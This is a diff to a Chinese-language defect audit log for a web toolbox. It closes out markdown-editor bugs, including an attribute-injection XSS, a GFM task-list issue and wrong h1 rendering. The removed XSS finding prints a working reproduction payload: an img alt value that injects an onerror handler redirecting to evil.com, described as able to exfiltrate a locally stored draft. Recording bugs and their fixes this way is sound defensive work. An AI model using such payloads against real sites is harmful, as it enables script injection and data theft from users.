@@ -58,7 +58,7 @@
 - Rust 转义 IT-N338 旧字节串非法 `\u{}` 路径已变化，当前 `tools/it/rust-escape.html:287-295` 明确拒绝非 ASCII；未运行编译回归，不正式销账。本批另阅读 REST、Ruby、Rust 速查搜索、分类和复制，未穷举语法正确性或运行页面。
 - 番茄钟 IT-N480、N481 已改为时间戳计时与跳过不落账并销账（第181批）；Redis IT-N543、N544 的原示例尚需独立复核（正则速查 IT-D30 已独立复核并修复，第170批）。本批另阅读 PostgreSQL、Python、Redis、正则速查的搜索、分类与复制，不把源码阅读当作运行通过。
 - 密码强度 IT-N536–N538 的计算与首位锚定路径仍在；MySQL、Nginx、PHP 速查本批仅阅读搜索/分类/复制，历史示例正确性未重新执行。
-- IT-N288 原图片 alt/链接 URL 未转义的实现已变化：当前 `tools/it/markdown-editor.html:706-715,769-780` 有属性转义及 URL 协议筛选，历史示例不能直接沿用；未经安全回归测试，不能认定全部注入风险消除或正式销账。IT-N289 的任务清单列表及 IT-N290 的 h1 映射仍是旧实现。
+- IT-N288/N289/N290 已于第211批真机回归并销账：XSS 防护（escAttr + safeUrl 协议白名单）与 GFM 任务清单复选框均在位，`#` 已改渲染 h1。
 - 同批阅读 Linux、MongoDB 速查的搜索、分类与复制路径；无浏览器验证，不对完整正确性判通过。IT-N498–N500 的示例仍须按具体内容另行运行复核。
 - IT-N423、N308、N309 的数据范围问题仍在。
 - IT-N170–N173、IT-N49 的关键路径仍在。
@@ -1554,21 +1554,7 @@
 - 方案：复制 `#outBig.textContent`（为空时提示"请输入文本"），并给 `i18nText` 传具体 key 或 fallback 字符串。
 **留存建议（tools/it/numeronym-generator.html）**：复制源切到 `#outBig`，与页面主展示一致。
 
-### IT-N288 预览/导出存在属性注入型 XSS（图片 alt、链接 URL 未转义）（高，确认缺陷）
-- 问题：解析器只转义 `<`/`>`/`&`，随后用模板拼 `<img src="$2" alt="$1">`、`<a href="$2" …>`；URL 与 alt 中的 `"` 未转义，可直接闭合属性并注入事件处理器。文档自己写着"必须过滤内嵌 HTML，防止 XSS"，但没有任何净化。
-- 证据：`tools/it/markdown-editor.html:759`（图片拼接）、`:762`（链接拼接）、`:710-712`（只转义三个字符）、`:527`（安全声明）、`:938`（`preview.innerHTML=html`）。
-- 复现（node 照抄两条正则）：输入 `![a" onerror="location.href='//evil.com'](x)` → 实际输出 `<img src="x" alt="a" onerror="location.href='//evil.com'">`；预览加载即执行 `location.href`，可外带 `localStorage['toolbox_md_draft']` 中的草稿。期望输出实体化后的 `alt="a&quot; onerror=…"` 纯文本。
-- 影响：粘贴不可信 Markdown（README/Issue/聊天记录）即可执行任意 JS；导出 .html 后同样带毒。
-- 方案：属性值统一走 `escAttr`（`"`→`&quot;`、`'`→`&#39;`），URL 做协议白名单（仅 http/https/mailto，禁 `javascript:`/`data:`），并本地引入 DOMPurify 做最后一道白名单净化。
-**留存建议（tools/it/markdown-editor.html）**：XSS 是本页最高优先，先补 `escAttr`+协议白名单，再谈语法扩展。
-
-### IT-N290 `#` 与 `##` 都渲染成 h2，预览与导出都没有 h1（低，确认缺陷）
-- 问题：`^#\s+` 被映射为 `<h2>`，与 `^##\s+` 相同，文档级一级标题在预览/导出 HTML 中不存在；这与 CommonMark 的 h1 语义不符，导出到别处层级整体下移。
-- 证据：`tools/it/markdown-editor.html:735-736`（两条都输出 `<h2>`）、`:521`（公式里明确写"# 与 ## 均输出 h2"，属有意为之）、`:203`（CSS 备了 h1 样式却用不到）。
-- 复现：输入 `# 标题` → 预览 `<h2>标题</h2>`；期望 `<h1>标题</h1>`。
-- 影响：复制到 GitHub/博客后大纲层级错误；页面 h1 样式成为死代码。
-- 方案：`#` 映射 h1（预览容器内无冲突），保留 `##`→h2；同步改 `:521` 文案。
-**留存建议（tools/it/markdown-editor.html）**：改一行正则 + 改一句说明即可。
+- `markdown-editor`：IT-N288 属性注入 XSS 与 IT-N289 GFM 任务清单源码已修好（`escAttr` + `safeUrl` 协议白名单、`- [x]` → 禁用复选框），清单及开头待办漏销账，本批补真机安全回归证据（alt 引号不闭合属性、`javascript:`/`data:text/html` 拦截、`data:image` 与正常链接放行、任务清单 checked 语义）；IT-N290 真修：`#` 由 `<h2>` 改为 `<h1>`（CommonMark 一级标题语义，`##`/`###`/`####` 不变），工作原理公式说明与 en JSON 中文键/英译同步。第211批销账；真机 16/16 vs 旧 13/16（3 项红均为 N290，N288/N289 旧态已绿如实记录），verify 4 条相关用例均不依赖 h2、无需改 expect。
 
 ### IT-N291 clamp 表达式算错：最小视口得到"首选字号"，大范围还会提前封顶（高，确认缺陷）
 - 问题：斜率用 `(pref-min)/(vwMin/100)` 与 `(max-min)/(vwMax/100)` 取 `max`，截距用 `pref - vw*vwMin/100`——等于把直线锚在 `(vwMin, pref)`，最小视口永远输出 `pref` 而非 `min`；当 `pref` 接近 `min` 时斜率取 `slope2` 也不对。正确应为 `(max-min)/(vwMax-vwMin)*100`、`min - slope*vwMin/100`。
